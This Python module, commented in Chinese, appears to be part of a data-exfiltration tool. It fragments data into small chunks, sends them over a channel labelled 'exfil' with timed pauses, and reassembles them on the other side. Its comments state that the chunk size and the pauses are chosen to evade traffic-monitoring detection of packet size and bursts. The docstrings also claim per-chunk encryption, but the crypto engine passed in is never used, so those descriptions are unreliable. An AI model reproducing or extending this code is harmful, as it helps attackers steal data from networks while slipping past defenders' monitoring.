"""
分片传输模块 (拓展功能)
大数据包按固定大小分片，每片独立加密传输，接收端重组
规避流量监控的单包大小检测
"""
import json
import time
import uuid
import struct
from typing import List, Optional


# 默认分片大小 (字节)，设置为较小值以规避检测
DEFAULT_CHUNK_SIZE = 4096


class Fragmenter:
    """数据分片器"""

    def __init__(self, chunk_size: int = DEFAULT_CHUNK_SIZE):
        self.chunk_size = chunk_size

    def fragment(self, data: bytes, transfer_id: str = None) -> List[dict]:
        """
        将数据分片

        Args:
            data: 原始数据
            transfer_id: 传输会话 ID

        Returns:
            分片列表，每个元素为字典
        """
        if not transfer_id:
            transfer_id = str(uuid.uuid4())[:8]

        total_chunks = (len(data) + self.chunk_size - 1) // self.chunk_size
        fragments = []

        for i in range(total_chunks):
            offset = i * self.chunk_size
            chunk_data = data[offset:offset + self.chunk_size]

            fragment = {
                "transfer_id": transfer_id,
                "chunk_index": i,
                "total_chunks": total_chunks,
                "chunk_size": len(chunk_data),
                "total_size": len(data),
                "data": chunk_data,
                "checksum": self._checksum(chunk_data),
            }
            fragments.append(fragment)

        return fragments

    def _checksum(self, data: bytes) -> int:
        """简单校验和"""
        return sum(data) & 0xFFFFFFFF


class Reassembler:
    """数据重组器"""

    def __init__(self):
        self._transfers = {}  # transfer_id -> {chunks: dict, total: int, total_size: int}

    def add_fragment(self, fragment: dict) -> Optional[bytes]:
        """
        添加一个分片，当所有分片到齐时返回完整数据

        Args:
            fragment: 分片字典

        Returns:
            完整数据（如果到齐），否则 None
        """
        tid = fragment["transfer_id"]
        idx = fragment["chunk_index"]
        total = fragment["total_chunks"]
        data = fragment["data"]
        checksum = fragment.get("checksum")

        # 校验
        if checksum is not None:
            expected = sum(data) & 0xFFFFFFFF
            if checksum != expected:
                raise ValueError(f"Checksum mismatch for {tid}[{idx}]")

        # 初始化传输会话
        if tid not in self._transfers:
            self._transfers[tid] = {
                "chunks": {},
                "total_chunks": total,
                "total_size": fragment.get("total_size", 0),
            }

        transfer = self._transfers[tid]
        transfer["chunks"][idx] = data

        # 检查是否全部到齐
        if len(transfer["chunks"]) == transfer["total_chunks"]:
            # 重组
            complete = b""
            for i in range(transfer["total_chunks"]):
                complete += transfer["chunks"][i]
            del self._transfers[tid]
            return complete

        return None

    def get_progress(self, transfer_id: str) -> dict:
        """获取指定传输的进度"""
        if transfer_id not in self._transfers:
            return {"status": "unknown"}
        transfer = self._transfers[transfer_id]
        return {
            "status": "in_progress",
            "received": len(transfer["chunks"]),
            "total": transfer["total_chunks"],
            "progress": f"{len(transfer['chunks'])}/{transfer['total_chunks']}",
        }

    def list_transfers(self) -> list:
        """列出所有进行中的传输"""
        return [
            {"transfer_id": tid, **self.get_progress(tid)}
            for tid in self._transfers
        ]


class FragmentedSender:
    """
    分片加密发送器
    将大数据分片后逐片加密发送，每片间隔可配置
    """

    def __init__(self, channel, crypto_engine, session_id: str,
                 chunk_size: int = DEFAULT_CHUNK_SIZE,
                 send_interval: float = 0.1):
        self.channel = channel
        self.crypto = crypto_engine
        self.session_id = session_id
        self.fragmenter = Fragmenter(chunk_size)
        self.send_interval = send_interval

    def send(self, data: bytes, msg_type: str = "exfil") -> bool:
        """分片发送数据"""
        fragments = self.fragmenter.fragment(data)

        for frag in fragments:
            # 将分片信息编码
            frag_meta = {
                "transfer_id": frag["transfer_id"],
                "chunk_index": frag["chunk_index"],
                "total_chunks": frag["total_chunks"],
                "total_size": frag["total_size"],
                "checksum": frag["checksum"],
            }
            meta_bytes = json.dumps(frag_meta).encode("utf-8")
            # 元数据 + 实际数据
            payload = struct.pack("!I", len(meta_bytes)) + meta_bytes + frag["data"]

            if not self.channel.send(payload, msg_type):
                return False

            # 发送间隔，规避流量突发检测
            if self.send_interval > 0:
                time.sleep(self.send_interval)

        return True


class FragmentedReceiver:
    """分片加密接收器"""

    def __init__(self, channel, crypto_engine):
        self.channel = channel
        self.crypto = crypto_engine
        self.reassembler = Reassembler()

    def recv_complete(self, timeout: float = 30.0) -> Optional[bytes]:
        """
        持续接收分片直到完整数据重组完成

        Returns:
            完整数据，超时返回 None
        """
        start = time.time()
        while time.time() - start < timeout:
            raw = self.channel.recv()
            if raw is None:
                time.sleep(0.1)
                continue

            # 解析分片
            meta_len = struct.unpack("!I", raw[:4])[0]
            meta_bytes = raw[4:4 + meta_len]
            frag_data = raw[4 + meta_len:]

            frag_meta = json.loads(meta_bytes.decode("utf-8"))
            fragment = {
                **frag_meta,
                "data": frag_data,
            }

            result = self.reassembler.add_fragment(fragment)
            if result is not None:
                return result

        return None
